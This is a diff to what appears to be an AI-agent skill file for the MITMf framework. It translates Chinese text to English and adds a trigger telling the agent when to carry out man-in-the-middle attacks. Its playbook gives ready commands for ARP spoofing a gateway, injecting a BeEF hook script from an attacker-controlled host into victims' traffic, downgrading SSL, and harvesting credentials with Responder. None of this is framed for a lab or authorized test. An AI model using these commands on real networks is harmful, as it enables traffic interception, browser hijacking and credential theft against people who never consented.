@@ -2,46 +2,50 @@
 name: mitmf-mitm
 description: "MITMf: ARP spoofing plus JS injection and credential harvesting. Signals: man-in-the-middle, MITM, SSL downgrade, integrated Responder."
 zh-signals: "MITMf: ARP 欺骗+JS 注入、欺骗+凭据收割。信号:中间人,mitm,SSL 降级,集成 Responder。"
+when-to-use: >-
+  Use when performing man-in-the-middle attacks on a local network, such as ARP
+  spoofing with JavaScript injection, credential harvesting, or SSL stripping;
+  run it on the attacker host with forwarding enabled.
 ---
 
 # MITMf
 
-- 攻击大类:C40 嗅探与中间人攻击
-- 上游仓库:https://github.com/byt3bl33d3r/MITMf
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
+- Upstream Repository: https://github.com/byt3bl33d3r/MITMf
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/byt3bl33d3r/MITMf && cd MITMf && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1` | ARP 欺骗 |
-| `--hsts` | SSL 降级 |
-| `--inject --js-url http://x.com/hook.js` | JS 注入 |
-| `--responder` | 集成 Responder |
-| `--log` | 见上游文档 |
-| `记录` | 见上游文档 |
+| `python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1` | ARP spoofing |
+| `--hsts` | SSL downgrade |
+| `--inject --js-url http://x.com/hook.js` | JS injection |
+| `--responder` | Integrated Responder |
+| `--log` | See the upstream documentation |
+| `logging` | See the upstream documentation |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### ARP 欺骗+JS 注入
+### ARP spoofing plus JS injection
 
 ```bash
 python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1 --inject --js-url http://10.8.0.2:3000/hook.js
-# 目标流量全过攻击机,BeEF hook 自动注入
+# All target traffic passes through the attacker machine, and the BeEF hook is injected automatically
 ```
 
-### 欺骗+凭据收割
+### Spoofing plus credential harvesting
 
 ```bash
 python mitmf.py --spoof --arp --gateway 10.0.0.1 --responder --hsts
 ```
 
-## 注意事项
+## Notes
 
-模块化 MITM 框架;JS 注入配 BeEF 是 XSS 被动化打法。
+A modular MITM framework; pairing JS injection with BeEF turns XSS into a passive technique.
